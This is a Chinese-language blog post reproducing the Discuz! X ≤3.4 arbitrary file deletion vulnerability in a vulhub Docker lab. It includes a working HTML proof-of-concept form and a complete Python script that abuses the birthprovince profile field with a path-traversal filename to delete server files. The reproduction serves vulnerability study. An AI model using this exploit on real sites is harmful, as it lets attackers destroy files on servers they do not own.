---
title: Discuz任意文件删除
date: 2022-04-01 10:57:53
updated: 2022-04-02 19:55:06
categories: 漏洞复现
tags:
urlname:
keywords: Discuz,任意文件删除
---

## Discuz任意文件删除

### 实验环境

官方于2017年9月28日对源码进行了修复，这里利用docker搭建环境：

```shell
cd vulhub/discuz/x3.4-arbitrary-file-deletion/
docker-compose up -d
```

服务器：CentOS7

攻击机：物理机（10.10.10.1）

环境搭建好后开始安装DZ

![](https://s2.loli.net/2022/03/31/vjrLZEaAqIUchby.png)

### 漏洞复现

1. 在服务器DZ根目录下建立hummer.txt文件，利用漏洞删除该文件

   检查hummer.txt文件存在

   ![](https://s2.loli.net/2022/03/31/JjuEU3rVbYtRHyX.png)

2. 注册Discuz用户，尝试修改个人信息

   http://10.10.10.142/Discuz/home.php?mod=spacecp

   ![](https://s2.loli.net/2022/03/31/CKBrn8ea4AoDwRT.png)

   填写个人信息后对该请求抓包：

   ![](https://s2.loli.net/2022/03/31/oKntBGSN4vjsf8q.png)

   从图中可以得到hummer用户的formhash=4c8ba00c

   将birthprovince的值改为要删除的文件名（hummer.txt）

   ![](https://s2.loli.net/2022/03/31/1gIl3W6bLD9OyhV.png)

   然后放包：

   可以看到已经成功将birthprovince的值改为了要删除的文件名

   ![](https://s2.loli.net/2022/03/31/S7OJdmZexGH895T.png)

   

3. 构造POC：

   ```html
   <form action="http://10.10.10.142/Discuz/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovi
   nce]=aaaaaa" method="POST" enctype="multipart/form-data">
   <input type="file" name="birthprovince" id="file" />
   <input type="text" name="formhash" value="89b14d12"/></p>
   <input type="text" name="profilesubmit" value="1"/></p>
   <input type="submit" value="Submit" />
   </from>
   ```
   
      ![](https://s2.loli.net/2022/04/01/e2NVs3HFB91nZ6i.png)
   
      点击提交后，会有如下响应：
   
      ![](https://s2.loli.net/2022/04/01/CEGNIKqHv3tMiU7.png)
   
      此时文件已经成功删除了
   
   4. 自动化脚本：
   
   ```python
   # -*- coding: utf-8 -*- 
   # @Time : 2022/4/1 16:22 
   # @Author : hummer
   # @File : Discuz.py
   
   import requests
   import re
   
   '''
   Discuz!X <=3.4 任意文件删除漏洞
   '''
   
   
   def get_cookie():
       cookies={}
       for line in raw_cookies .split(';'):
           key,value = line.split('=',1)
           cookies[key]=value
       return cookies
   
   def get_formhash(url):
       cookies = get_cookie()
       testurl = url + "/home.php?mod=spacecp"
       html = requests.get(testurl,cookies=cookies)
       com = re.compile('<input type="hidden" name="formhash" value="(.*?)" />')
       result = com.findall(html.text)
       return result[0]
   
   def del_step1(url,filename):
       headers={
           'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
       }
       geturl = url + "/home.php?mod=spacecp&ac=profile&op=base"
       formhash=get_formhash(url)
       print("formhash: " + formhash)
       payload = {'birthprovince':filename,'profilesubmit':1,'formhash':formhash}
       cookies = get_cookie()
       html = requests.post(geturl,headers=headers,data=payload,cookies=cookies)
       if html.text.find('parent.show_success')>0:
           print('Step1 success!')
   
   def del_step2(url):
       geturl = url + '/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa'
       headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
       formhash = get_formhash(url)
       files = {'formhash':(None,formhash),'birthprovince':('1.jpg',open('1.jpg','rb'),'image/jepg'),'profilesubmit':(None,1)}
       cookies = get_cookie()
       r = requests.post(geturl,files=files,headers=headers,cookies=cookies)
       if r.text.find('parent.show_success')>0:
           print("Step2 success!")
   
   if __name__ == '__main__':
       raw_cookies = "QEWn_2132_saltkey=jB44A7n7; QEWn_2132_lastvisit=1648895823; QEWn_2132_sid=KrpF5f; QEWn_2132_lastact=1648899609%09home.php%09misc; QEWn_2132_sendmail=1; QEWn_2132_seccode=1.21187a98997a88f189; QEWn_2132_ulastactivity=9ebcAx%2FzsiL2Ju3gB4nnVG5GBBHyFTeCzO6%2FbmGu9WxSCw8brZTS; QEWn_2132_auth=afde08MuW%2BAKdFLrgYSqhflGjsYLnWVSBtpPs6HBpmnwkPkewQvRZIgT1G6mgVSIU7FxCC9L84iX7RSX2PIb; QEWn_2132_nofavfid=1; QEWn_2132_onlineusernum=1; QEWn_2132_noticeTitle=1"
   
       url = 'http://10.10.10.145'
       del_step1(url,'../../../hummer.txt')
       del_step2(url)
   ```
   
   

   运行结果如下：

![](https://s2.loli.net/2022/04/02/r4EjSPtsdRmbcYC.png)

   

漏洞复现完成